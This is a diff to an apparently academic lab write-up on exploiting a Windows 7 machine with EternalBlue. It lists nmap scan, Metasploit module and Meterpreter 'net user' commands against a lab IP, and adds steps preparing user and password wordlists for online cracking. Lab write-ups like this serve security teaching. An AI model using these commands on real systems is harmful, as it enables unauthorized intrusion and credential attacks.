@@ -22,14 +22,14 @@ This milestone focuses on exploiting a Windows 7 machine using the EternalBlue v
 **Objective:** Gain remote code execution by exploiting a vulnerable SMB service on the Windows 7 target.
 
 **Steps Taken:**
-1. Scanned the target to confirm port 445 is open:
+1. Scan the target to confirm port 445 is open:
    ```bash
    nmap -p 445 --script smb-vuln-ms17-010 192.168.57.20
    ```
    - `-p 445` specifies the SMB port.
    - `--script smb-vuln-ms17-010` runs the NSE script to detect MS17-010 vulnerability.
 
-2. Launched Metasploit and configured the EternalBlue module:
+2. Launch Metasploit and configured the EternalBlue module:
    ```bash
    use exploit/windows/smb/ms17_010_eternalblue
    set RHOST 192.168.57.20
@@ -48,9 +48,9 @@ This milestone focuses on exploiting a Windows 7 machine using the EternalBlue v
 **Figure 1:** Meterpreter session established post-exploitation.
 
 ---
-## 3.2 User Enumeration
+## 3.2 User Enumeration and creation of user and wordlist text files
 
-**Objective:** Identify valid user accounts on the compromised host for further password attacks.
+**Objective:** Identify valid user accounts on the compromised host for further password attacks and creation of text files for the online password cracking 
 
 **Steps Taken:**
 1. In Meterpreter:
@@ -58,9 +58,14 @@ This milestone focuses on exploiting a Windows 7 machine using the EternalBlue v
    shell
    net user
    ```
-2. Identified local users: Administrator, student, Guest.
+2. Identify local users: Administrator, student, Guest.
+3. Create `users.txt` and `wordlist.txt` using `nano`.
+4. Verify with `cat` command.
 
 **Results:**
 - Enumerated users confirmed valid accounts that could be targeted for password attacks.
+- Successfully created and confirmed presence of valid username and password lists.
 
 **Figure 2:** User enumeration output from `net user`.
+
+**Figure 3:** Contents of `users.txt` and `wordlist.txt`.
